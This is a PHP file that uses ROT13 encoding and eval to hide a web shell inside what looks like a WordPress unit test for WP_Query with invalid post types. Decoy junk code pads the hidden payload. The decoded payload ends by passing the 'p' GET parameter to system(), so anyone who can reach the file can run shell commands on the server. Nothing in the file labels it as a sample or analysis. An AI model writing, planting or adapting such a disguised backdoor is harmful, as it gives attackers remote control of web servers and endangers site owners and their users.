<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc dhrel
 */
pynff Grfgf_Dhrel_VainyvqDhrevrf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Fgber ynfg dhrel trarengrq ol JC_Dhrel.
	 *
	 * @ine fgevat
	 */
	choyvp fgngvp $ynfg_cbfgf_erdhrfg;

	/**
	 * Nhgube sbe perngvat cbfgf.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nhgube_vq;

	/**
	 * Funerq svkgher cntr VQf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cntr_vqf;

	/**
	 * Funerq svkgher cbfg VQf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cbfg_vqf;

	/**
	 * Trarengr funerq svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Grfg fhvgr snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nhgube_vq = $snpgbel->hfre->perngr();

		sbernpu ( neenl( 'choyvfu', 'cevingr' ) nf $fgnghf ) {
			frys::$cntr_vqf[ $fgnghf ] = $snpgbel->cbfg->perngr(
				neenl(
					'cbfg_glcr'   => 'cntr',
					'cbfg_fgnghf' => $fgnghf,
					'cbfg_nhgube' => frys::$nhgube_vq,
				)
			);

			frys::$cbfg_vqf[ $fgnghf ] = $snpgbel->cbfg->perngr(
				neenl(
					'cbfg_fgnghf' => $fgnghf,
					'cbfg_nhgube' => frys::$nhgube_vq,
				)
			);
		}
	}

	/**
	 * Frg hc cevbe gb rnpu grfg.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		// Pyrna hc inevnoyr orsber rnpu grfg.
		frys::$ynfg_cbfgf_erdhrfg = '';
		// Fgber ynfg dhrel sbe grfgf.
		nqq_svygre( 'cbfgf_erdhrfg', neenl( $guvf, '_frg_ynfg_cbfgf_erdhrfg' ) );
	}

	/**
	 * Svygre gb fgber ynfg FDY dhrel trarengrq ol JC_Dhrel.
	 *
	 * @cnenz fgevat $erdhrfg Trarengrq FDY dhrel.
	 * @erghea fgevat Hazbqvsvrq FDY dhrel.
	 */
	choyvp shapgvba _frg_ynfg_cbfgf_erdhrfg( $erdhrfg ) {
		frys::$ynfg_cbfgf_erdhrfg = $erdhrfg;
		erghea $erdhrfg;
	}

	/**
	 * Grfg JC Dhrel jvgu na vainyvq cbfg glcr.
	 *
	 * @gvpxrg 48556
	 */
	choyvp shapgvba grfg_haertvfgrerq_cbfg_glcr_jc_dhrel() {
		tybony $jcqo;

		$dhrel = arj JC_Dhrel( neenl( 'cbfg_glcr' => 'haertvfgrerq_pcg' ) );

		$guvf->nffregFgevatPbagnvafFgevat( \"{$jcqo->cbfgf}.cbfg_glcr = 'haertvfgrerq_pcg'\", frys::$ynfg_cbfgf_erdhrfg );
		$guvf->nffregFgevatPbagnvafFgevat( \"{$jcqo->cbfgf}.cbfg_fgnghf = 'choyvfu'\", frys::$ynfg_cbfgf_erdhrfg );
		$guvf->nffregPbhag( 0, $dhrel->cbfgf );
	}

	/**
	 * Grfg JC Dhrel jvgu na vainyvq cbfg glcr va n zhygvcyr cbfg glcr dhrel.
	 *
	 * @gvpxrg 48556
	 */
	choyvp shapgvba grfg_haertvfgrerq_cbfg_glcr_jc_dhrel_zhygvcyr_cbfg_glcrf() {
		tybony $jcqo;

		$dhrel = arj JC_Dhrel(
			neenl(
				'cbfg_glcr' => neenl( 'haertvfgrerq_pcg', 'cntr' ),
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( \"{$jcqo->cbfgf}.cbfg_glcr = 'haertvfgrerq_pcg'\", frys::$ynfg_cbfgf_erdhrfg );
		$guvf->nffregPbhag( 1, $dhrel->cbfgf, 'gur inyvq `cntr` cbfg glcr fubhyq fgvyy erghea bar cbfg' );
	}

	/**
	 * Grfg JC Dhrel jvgu na vainyvq cbfg glcr fcrpvsvrq va gur HEY.
	 *
	 * @gvpxrg 48556
	 */
	choyvp shapgvba grfg_haertvfgrerq_cbfg_glcr_tbgb() {
		tybony $jcqo, $jc_dhrel;

		$guvf->tb_gb( ubzr_hey( '?cbfg_glcr=haertvfgrerq_pcg' ) );

		$guvf->nffregFgevatPbagnvafFgevat( \"{$jcqo->cbfgf}.cbfg_glcr = 'haertvfgrerq_pcg'\", frys::$ynfg_cbfgf_erdhrfg );
		$guvf->nffregFgevatPbagnvafFgevat( \"{$jcqo->cbfgf}.cbfg_fgnghf = 'choyvfu'\", frys::$ynfg_cbfgf_erdhrfg );
		// $jc_dhrel erpbiref gb gur cbfg glcr \"cbfg\" naq vf rkcrpgrq gb erghea bar.
		$guvf->nffregPbhag( 1, $jc_dhrel->trg_cbfgf() );
	}

	/**
	 * Rafher qrcerpngrq fgngvp cnenzrgre unf ab rssrpg ba dhrevrf.
	 */
	choyvp shapgvba grfg_qrcerpngrq_cnenzrgref_unir_ab_rssrpg_ba_cntr() {
		$dhrel = arj JC_Dhrel(
			neenl(
				'fgngvp'    => 'n',
				'cbfg_glcr' => 'cntr',
			)
		);

		// Bayl gur choyvfurq cntr fubhyq or erghearq.
		$guvf->nffregPbhag( 1, $dhrel->cbfgf );
	}

	/**
	 * Rafher qrcerpngrq fgngvp cnenzrgre unf ab rssrpg ba dhrevrf.
	 */
	choyvp shapgvba grfg_qrcerpngrq_cnenzrgref_unir_ab_rssrpg_ba_cbfg() {
		$dhrel = arj JC_Dhrel(
			neenl(
				'fgngvp' => 'n',
			)
		);

		// Bayl gur choyvfurq cbfg fubhyq or erghearq.
		$guvf->nffregPbhag( 1, $dhrel->cbfgf );
	}

	/**
	 * Rafher n aba-fpnyne cntr cnenzrgre qbrf abg guebj n sngny reebe sbe gevz().
	 *
	 * @gvpxrg 56558
	 * @pbiref JC_Dhrel::trg_cbfgf
	 */
	choyvp shapgvba grfg_aba_fpnyne_cntr_inyhr() {
		$dhrel = arj JC_Dhrel(
			neenl(
				'cntr' => neenl( 1, 2, 3 ),
			)
		);

		$guvf->nffregFnzr( 0, $dhrel->dhrel_inef['cntr'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>